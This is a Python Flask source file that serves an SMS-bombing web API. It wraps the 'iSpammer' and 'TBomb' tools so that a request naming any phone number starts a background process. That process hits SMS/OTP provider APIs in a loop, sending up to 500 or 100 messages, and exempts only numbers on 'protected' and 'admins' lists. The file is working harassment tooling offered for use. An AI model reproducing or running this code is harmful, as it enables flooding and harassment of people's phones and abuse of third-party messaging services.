from flask import Flask, render_template, redirect, request, jsonify
from api import infinite
from tbomb.utils import provider
import multiprocessing

app = Flask(__name__)

protected = []
admins = []

@app.route('/')
def index():
    return '<h1>Index Page</h1>'

@app.route('/bomb/<string:mobile_number>/<int:messages>')
def bomb(mobile_number, messages):
    try:
        mobile_number = int(mobile_number)
        messages = int(messages)
    except:
        return jsonify(
            Response = "Please Provide Correct Parameters.",
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "iSpammer",
            Creator = "MrSp4rX"
        )

    if len(str(mobile_number)) == 10 and int(messages) <= 500 and str(mobile_number) not in protected and str(mobile_number) not in admins:
        bombing = multiprocessing.Process(target=infinite, args=[mobile_number, messages])
        bombing.start()
        return jsonify(
            Response = "Bombing is Being Started",
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "iSpammer",
            Creator = "MrSp4rX"
        )
    
    return jsonify(
        Response = "Something went Wrong",
        Mobile_Number = mobile_number,
        Messages = messages,
        Tool = "iSpammer",
        Creator = "MrSp4rX"
    )

def bombing_loop(cc, mobile_number, mode, times):
    temp = provider.APIProvider(cc, mobile_number, mode)
    for time in range(times):
        temp.hit()

@app.route('/bombint/<int:cc>/<string:mobile_number>/<int:messages>')
def bombint(cc, mobile_number, messages):
    try:
        cc = int(cc)
        mobile_number = int(mobile_number)
        messages = int(messages)
    except:
        return jsonify(
            Response = "Please Provide Correct Parameters.",
            Country_Code = cc,
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "TBomb",
            Creator = "TheSpeedX"
        )

    if int(messages) <= 100 and str(cc)+str(mobile_number) not in protected and str(cc)+str(mobile_number) not in admins and len(str(cc)) <= 3:
        bombing = multiprocessing.Process(target=bombing_loop, args=[cc, mobile_number, 'sms', messages])
        bombing.start()
        return jsonify(
            Response = "Bombing is Being Started",
            Country_Code = cc,
            Mobile_Number = mobile_number,
            Messages = messages,
            Tool = "TBomb",
            Creator = "TheSpeedX"
        )
    
    return jsonify(
        Response = "Something went Wrong",
        Country_Code = cc,
        Mobile_Number = mobile_number,
        Messages = messages,
        Tool = "TBomb",
        Creator = "TheSpeedX"
    )

@app.errorhandler(404)
def errorhandler(e):
    print(e)
    return jsonify(
        Response = str(e)
    )

if __name__=="__main__":
    app.run(port=80, debug=True)
